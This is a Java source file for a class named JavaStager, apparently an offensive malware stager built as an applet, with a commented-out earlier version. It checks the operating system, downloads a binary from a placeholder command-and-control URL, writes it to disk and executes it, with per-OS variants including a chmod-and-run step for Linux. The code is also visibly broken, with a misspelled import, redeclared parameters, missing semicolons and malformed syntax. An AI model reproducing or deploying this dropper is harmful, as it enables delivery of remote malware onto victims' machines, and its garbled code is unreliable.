import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileOuputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.applet.Applet;

public class JavaStager extends Applet{

    private static String OS = System.getProperty("os.name").toLowerCase();

    public static void main(String[] args) {
        if (isWindows()) {
            stager("c2.exe", new URL("http://yourc2url.exe"));
        } else if (isMac()) {
            stager("c2_signed_mac_binary", new URL("http://yourc3url.com/c2c2_signed_mac_binary"));
        } else if (isLinux()) {
            stager("linux_binary", new URL("http://yourc2url.com/linux_binary"));
        }
    }

    public static void stager(String fileName, URL link) {
        try {
            String fileName = "c2.exe";
            URL link = new URL("http://yourc2url.exe");
            InputStream in = new BufferedInputStream(link.openStream());
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buf = new byte[1024];
            int n = 0;
            while(-1 != (n = in.read(buf))) {
                out.write(buf, 0, n);
            }

            out.close();
            in.close();

            byte[] response = out.toByteArray();
            FileOuputStream fos = new FileOuputStream(fileName);
            fos.write(response);
            fos.close();
            Process process = new ProcessBuilder("c2.exe").start();
        } catch(IOException ioe) {
            System.out.println("Error occurred in windows stager")
        }
    }

    public static boolean isWindows() {
        return (OS.indexOf("win") >= 0);
    }

    public static boolean isMac() {
        return (OS.indexOf("mac") >= 0);
    }

    public static boolean isLinux()) {
        return (OS.indexOf("linux") >= 0);
    }

    /* Old way
    public static void main(String[] args) {
        if (isWindows()) {
            try {
                String fileName = "c2.exe";
                URL link = new URL("http://yourc2url.exe");
                InputStream in = new BufferedInputStream(link.openStream());
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                byte[] buf = new byte[1024];
                int n = 0;
                while(-1 != (n = in.read(buf))) {
                    out.write(buf, 0, n);
                }

                out.close();
                in.close();

                byte[] response = out.toByteArray();
                FileOuputStream fos = new FileOuputStream(fileName);
                fos.write(response);
                fos.close();
                Process process = new ProcessBuilder("c2.exe").start();
            } catch(IOException ioe) {
                System.out.println("Error occurred in windows stager")
            }
        } else if (isMac()) {
            try {
                String fileName = "c2_signed_mac_binary";
                URL link = new URL("http://yourc3url.com/c2c2_signed_mac_binary");
                InputStream in = new BufferedInputStream(link.openStream());
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                byte[] buf = new byte[1024];
                int n = 0;
                while (-1!=(n=in.read())) {
                    out.write(buf, 0, n);
                }
                out.close();
                in.close();
                byte[] response = out.toByteArray();
                FileOuputStream fos = new FileOuputStream(fileName);
                fos.write(response);
                fos.close();
                Process process = new ProcessBuilder("c2c2_signed_mac_binary").start();
            } catch (IOException ioe) {
                System.out.println("Error occured in Mac stager");
            }
        } else if (isLinux()) {
            try {
                String fileName = "linux_binary";
                URL link = new URL("http://yourc2url.com/linux_binary");
                InputStream in = new BufferedInputStream(link.openStream());
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                byte[] buf = new byte[1024];
                int n = 0;
                while (-1!=(n!=in.read(buf))) {
                    out.write(buf, 0, n);
                }
                out.close();
                in.close();
                byte[] response = out.toByteArray();
                FileOuputStream fos = new FileOutputStream(fileName);
                fos.write(response);
                fos.close();
                Process process = new ProcessBuilder("chmod +x linux_binary; ./linux_binary").start();
            } catch (IOException ioe) {
                System.out.println("Error occurred in Linux stager");
            } else {
                // do nothing
            }
        }
        */
}
